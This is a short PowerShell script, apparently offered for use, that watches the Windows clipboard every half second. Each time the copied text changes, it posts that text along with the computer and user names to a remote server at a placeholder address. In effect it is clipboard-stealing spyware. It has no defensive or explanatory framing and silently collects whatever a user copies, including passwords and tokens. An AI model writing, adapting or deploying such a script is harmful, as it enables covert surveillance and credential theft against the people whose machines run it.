Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Web

$previousClipboard = ""

# Function to send clipboard data to the server
function Send-ClipboardData($clipboardContent) {
    $machineName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $url = "http://<your-server-ip>:5000/clipboard_receiver"

    $body = @{
        clipboard_data = $clipboardContent
        machine_name   = $machineName
        user_name      = $userName
    }

    try {
        Invoke-WebRequest -Uri $url -Method POST -Body $body
        Write-Host "Clipboard data sent: $clipboardContent"
    } catch {
        Write-Host "Failed to send clipboard data: $_"
    }
}

# Main loop to monitor clipboard changes
while ($true) {
    try {
        $currentClipboard = [System.Windows.Forms.Clipboard]::GetText()

        # Check if clipboard content has changed
        if ($currentClipboard -ne $previousClipboard -and $currentClipboard -ne "") {
            $previousClipboard = $currentClipboard
            Send-ClipboardData -clipboardContent $currentClipboard
        }
    } catch {
        Write-Host "Error reading clipboard: $_"
    }

    Start-Sleep -Milliseconds 500 # Small delay to avoid excessive CPU usage
}
